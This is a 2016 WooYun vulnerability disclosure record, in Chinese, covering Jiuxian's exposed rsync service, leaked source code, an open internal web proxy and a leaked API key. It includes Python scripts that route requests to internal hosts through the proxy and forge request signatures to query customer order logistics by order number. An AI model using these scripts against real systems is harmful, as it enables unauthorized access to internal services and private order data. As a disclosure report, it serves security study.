{"id": 74798, "wybug_id": "wooyun-2016-0169638", "wybug_title": "从一个Rsync匿名访问到各种资源泄漏", "wybug_corp": "酒仙网", "wybug_author": "Tea", "wybug_date": "2016-01-13 17:05", "wybug_open_date": "2016-02-25 18:03", "wybug_type": "未授权访问/权限绕过", "wybug_level": "高", "wybug_rank_0": "20", "wybug_status": "厂商已经修复", "wybug_from": "http://www.wooyun.org", "wybug_tags": "", "wybug_detail": "漏洞详情 披露状态：   \t\t\t\t\t\t\t\t\t2016-01-13：\t细节已通知厂商并且等待厂商处理中\t\t\t\t\t\t\t\t\t2016-01-14：\t厂商已经确认，细节仅向厂商公开\t\t\t\t\t\t\t\t\t2016-01-24：\t细节向核心白帽子及相关领域专家公开\t\t\t\t\t\t\t\t\t2016-02-03：\t细节向普通白帽子公开\t\t\t\t\t\t\t\t\t2016-02-13：\t细节向实习白帽子公开\t\t\t\t\t\t\t\t\t2016-02-25：\t厂商已经修复漏洞并主动公开，细节向公众公开  简要描述： 快过年了，打发点RANK吧。。。 详细说明：  一日无聊发现一个IP（106.39.37.169）存在RSYNC匿名访问服务，遂发现存在一个WAR文件，下载下来发现为酒仙网的服务源码。其中翻到了许多接口文件，许多密码（虽然不少已经过期）。从其中翻到的一个接口KEY，可以查询到网站的订单信息。下来一一道来。因为对JAVA不熟悉，都是带有猜想。从各种配置文件中找出来了一些配置文件。都没发现有挺大的用处。翻看源码的时候发现了一个WEB代理。代码如下：\n\n访问的地址把我们限制住了：\n((!Pattern.matches(\"^http://\\\\w+\\\\.jiuxian\\\\.com.*$\", url)) && (!Pattern.matches(\"^http://\\\\w+\\\\.jxwmanage\\\\.com.*$\", url))))\n但是也不妨碍我们访问外网用户访问不到的资源。利用方式：http://106.39.37.169:8010/mobileservices/httpProxyAccess.htm?target=http://xxxxx/我们试试访问一下乌云漏洞库里面酒仙网的漏洞（内网才能访问的地址）\n\n参考下： WooYun: 酒仙网接口敏感信息泄露 我们访问下（这个内网才可以访问）：\n\n能访问到了，但是有乱码？没事，我们转换转换：Python脚本如下：\n#!/usr/bin/python#encoding: utf-8import sysimport requestsreload(sys)sys.setdefaultencoding( \"utf-8\" )def main():\turl = 'http://106.39.37.169:8010/mobileservices/httpProxyAccess.htm?target=http://mtest1.jiuxian.com/home/index/user/login'\tproxy_get = requests.get(url)\tcontent = proxy_get.text.encode('ISO8859', 'ignore').encode('gbk','ignore')\tprint contentif __name__ == '__main__':\tmain()\n正常显示：\n\n如果要访问到其他的连接再GET过去就OK了。其他的内部访问地址（这些域名扫描工具都可以扫描出来）：http://pt.jxwmanage.com/\n\n\n\n\n\n\n\n\n\n还有其他的内部系统就不一一列举了。此处的问题就是想提下，代理任何人知道地址都能访问到。当看见一个API地址的时候，发现存在一个securityKey=。就跟踪看了下功能：接口地址：\n\n跟踪看了下：两个Controller.\n\n一个是订单有关系的，一个是地址有关系的，我们找出了两个方法：\nparaMap.put(\"method\", \"GetTraceList\");\n还有个：\nparam.put(\"method\", \"EditUserAddressInfo\");\n都是调用API使用的功能。我们这里只测试下第一个方法（调用的API）看下源码：这里给出主要的源码，详细的就不给出来了：\nString url = ErpUrlProperties.get(\"domain.erp\"); //API接口地址        Map paraMap = new HashMap();        paraMap.put(\"method\", \"GetTraceList\");        paraMap.put(\"userId\", userId);        paraMap.put(\"order_no\", order.getOrderSN());        paraMap.put(\"times\", Long.valueOf(System.currentTimeMillis()));        paraMap.put(\"sign\", HttpClientUtil.generateSign(paraMap)); //这里带入计算sign,其中会用到api.erp.securityKey        String content = HttpClientUtil.post(url, paraMap); //带上所有的参数请求\nPython实现代码：\n#!/usr/bin/python#encoding: utf-8#date:2015/01import sysimport timeimport urllibimport jsonimport hashlibimport requestsdef main():\t'''\tmethod_tmp = sys.argv[1]\t'''\tmethod_tmp = 'GetTraceList'\tget_url2(method_tmp)def get_url2(method_str):\tpar = {\"method\" : method_str,\t       \"times\" : int(time.time()).__str__(),\t       \"userId\" : \"\",\t       \"order_no\": \"订单号\",\t       }\tsign = get_md5_sig2(par)\tpar['sign'] = sign\tprint urllib.urlencode(par).encode(\"utf8\")\trequest_api(par)def request_api(par):\tapi_url = \"API地址\"\theaders = {\"User-Agent\": \"Mozilla/5.0 (Macintosh; Intel Mac OS X 10_10_5) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/47.0.2526.106 Safari/537.36\"}\tpost_data = par\tapi_get = requests.post(api_url,post_data,headers=headers)\tapi_result = api_get.text\tjson_result = json.loads(api_result)\tprint json_result\tprint json_result['message']\tfor line in json_result['data']:\t\tprint line['info'],'--',line['invoice_no']def get_md5_sig2(par_str):\tmd5_key = \"我就是那串KEY\"\tif par_str:\t\tnew_par_str = {}\t\tfor par in par_str.keys():\t\t\tif par.lower() != 'sign':\t\t\t\tnew_par_str[par.lower().replace('_','').replace('(','').replace(')','')] = par_str.get(par).__str__().lower().replace('(','').replace(')','')\t\tnew_par_str = sorted(new_par_str.iteritems(), key = lambda fuck:fuck[0])\t\tpar_str1 = urllib.urlencode(new_par_str).encode(\"utf8\").__str__().replace('=','%3d').replace('&','%26')\t\tpar_str1_md5 = get_md5hash(par_str1)\t\tpar_str2_md5 = get_md5hash(md5_key + par_str1_md5)\t\treturn par_str2_md5def get_md5hash(tmp_str):\tmd5_hash = hashlib.md5()\tmd5_hash.update(tmp_str)\treturn md5_hash.hexdigest()if __name__ == '__main__':\tmain()\n我们从乌云里面找一些泄漏的订单号测试下：比如：http://static.loner.fm/upload/201505/05184644892cea7eceeffa34c120293c9d066bf0.png订单号：18150320092518442132\n\n我们再来查询下这个订单：\n\n再测试点其他的订单：http://static.loner.fm/upload/201506/222250396d63d3873e8502d5714adf376103ec2f.jpg结果：\n\n\n\n现在我们应该可以获取所有的订单的物流号之类的信息了。看起来像编辑用户地址信息的方法我们这里就不测试了。\nparam.put(\"method\", \"EditUserAddressInfo\");\n因为就找到这两个方法，接口应该会有很多种不同功能的方法。要么就是去找源码，要么就靠有规律的去猜测了。自己猜测了半天没有猜测到一个新的方法出来，就此作罢。因为方法不存在跟存在的方法报错的信息是有区别的。此处测试，就此结束吧。未做任何破坏。   漏洞证明：  Rsync主机信息：\n\n下载的war文件解压：\n\n对应的提供服务地址：http://106.39.37.169:8010/mobileservices/\n\n翻出来的各种信息:\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n没有在这些文件里面找到数据库的连接信息。   修复方案：  RSYNC的匿名访问导致了源码可下载，然后获取源码发现其中的功能跟API的KEY泄漏。我知道了的信息都改一遍吧。这样最好。   版权声明：转载请注明来源 Tea@乌云\n ", "wybug_reply": "漏洞回应  厂商回应： 危害等级：高 漏洞Rank：10  确认时间：2016-01-14 10:29 厂商回复： 感谢发现漏洞，尽快整改 最新状态： 2016-02-25：漏洞已修复，感谢！  ", "replys": "漏洞评价：\n评价\n  \n\n\n", "wybug_level_fromcorp": "高", "wybug_rank_fromcorp": 10, "Ranks": null}